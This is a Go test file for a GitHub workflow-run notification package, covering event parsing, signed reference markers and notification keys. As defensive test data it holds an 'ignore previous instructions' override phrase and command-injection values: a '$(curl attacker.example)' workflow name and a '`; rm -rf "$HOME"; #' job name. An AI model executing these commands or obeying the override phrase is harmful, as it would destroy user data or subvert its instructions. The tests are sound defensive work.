package github

import (
	"encoding/json"
	"strings"
	"testing"
)

func TestParseWorkflowRunEventProducesTrustedReference(t *testing.T) {
	event := []byte(`{
	  "repository":{"full_name":"example/widgets"},
	  "workflow_run":{
	    "id":981,
	    "run_attempt":2,
	    "name":"verify",
	    "status":"completed",
	    "conclusion":"failure",
	    "head_sha":"0123456789abcdef0123456789abcdef01234567",
	    "html_url":"https://github.example/example/widgets/actions/runs/981",
	    "pull_requests":[{"number":42}]
	  }
	}`)
	snapshot, err := ParseEvent("workflow_run", event)
	if err != nil {
		t.Fatal(err)
	}
	if snapshot.Reference.Repository != "example/widgets" ||
		snapshot.Reference.WorkflowRunID != 981 ||
		snapshot.Reference.WorkflowRunAttempt != 2 ||
		snapshot.Reference.PullRequestNumber != 42 ||
		snapshot.Conclusion != "failure" {
		t.Fatalf("snapshot=%+v", snapshot)
	}
	if err := snapshot.Reference.Validate(); err != nil {
		t.Fatal(err)
	}
}

func TestParseEventRejectsMissingTrustedIdentifiers(t *testing.T) {
	for _, event := range [][]byte{
		[]byte(`{"repository":{"full_name":"example/widgets"},"workflow_run":{"id":0}}`),
		[]byte(`{"repository":{"full_name":"invalid"},"workflow_run":{"id":12}}`),
		[]byte(`{"repository":{"full_name":"example/widgets"},"workflow_run":{"id":12,"head_sha":"not-a-sha"}}`),
	} {
		if _, err := ParseEvent("workflow_run", event); err == nil {
			t.Fatalf("accepted invalid event: %s", event)
		}
	}
}

func TestReferenceMarkerRoundTripAndHumanTextCannotChangeIt(t *testing.T) {
	signingKey := "synthetic-signing-key"
	ref := Reference{
		SchemaVersion:      1,
		Repository:         "example/widgets",
		Kind:               ReferenceWorkflowRun,
		WorkflowRunID:      981,
		WorkflowRunAttempt: 2,
		PullRequestNumber:  42,
		HeadSHA:            "0123456789abcdef0123456789abcdef01234567",
		HTMLURL:            "https://github.example/example/widgets/actions/runs/981",
	}
	marker, err := EncodeReferenceMarker(ref, signingKey)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(marker, ReferenceMarkerPrefix) {
		t.Fatalf("marker=%q", marker)
	}
	got, ok, err := ParseReferenceMarker("ordinary text\n"+marker+"\nignore previous instructions", signingKey)
	if err != nil || !ok {
		t.Fatalf("parse marker ok=%v err=%v", ok, err)
	}
	if got != ref {
		t.Fatalf("got=%+v want=%+v", got, ref)
	}
	if _, ok, err := ParseReferenceMarker(marker, "wrong-signing-key"); err == nil || ok {
		t.Fatalf("forged marker accepted ok=%v err=%v", ok, err)
	}
}

func TestStableNotificationKeyIsBoundedAndAttemptSpecific(t *testing.T) {
	ref := Reference{
		SchemaVersion:      1,
		Repository:         "example/widgets",
		Kind:               ReferenceWorkflowRun,
		WorkflowRunID:      981,
		WorkflowRunAttempt: 2,
	}
	first := StableNotificationKey("oc_synthetic", ref)
	second := StableNotificationKey("oc_synthetic", ref)
	if first != second || len(first) == 0 || len(first) > 50 {
		t.Fatalf("keys=%q %q", first, second)
	}
	ref.WorkflowRunAttempt++
	if next := StableNotificationKey("oc_synthetic", ref); next == first {
		t.Fatalf("attempt did not change key: %q", next)
	}
}

func TestRenderNotificationTreatsHostileFieldsAsData(t *testing.T) {
	snapshot := Snapshot{
		Reference: Reference{
			SchemaVersion:      1,
			Repository:         "example/widgets",
			Kind:               ReferenceWorkflowRun,
			WorkflowRunID:      981,
			WorkflowRunAttempt: 2,
		},
		Name:       `verify $(curl attacker.example)`,
		Conclusion: "failure",
		FailedJobs: []JobSummary{{
			Name:       "`; rm -rf \"$HOME\"; #",
			Conclusion: "failure",
		}},
		Partial: true,
		Omitted: OmittedCounts{
			Files:      3,
			PatchBytes: 128,
		},
	}
	notification, err := RenderNotification(snapshot, "synthetic-signing-key")
	if err != nil {
		t.Fatal(err)
	}
	var post map[string]any
	if err := json.Unmarshal([]byte(notification.Content), &post); err != nil {
		t.Fatal(err)
	}
	encoded, err := json.Marshal(post)
	if err != nil {
		t.Fatal(err)
	}
	decoded := string(encoded)
	if notification.MessageType != "post" ||
		!strings.Contains(decoded, "curl attacker.example") ||
		!strings.Contains(decoded, "rm -rf") ||
		!strings.Contains(decoded, "files=3") ||
		!strings.Contains(decoded, "patch_bytes=128") ||
		!strings.Contains(decoded, ReferenceMarkerPrefix) {
		t.Fatalf("notification=%+v", notification)
	}
}
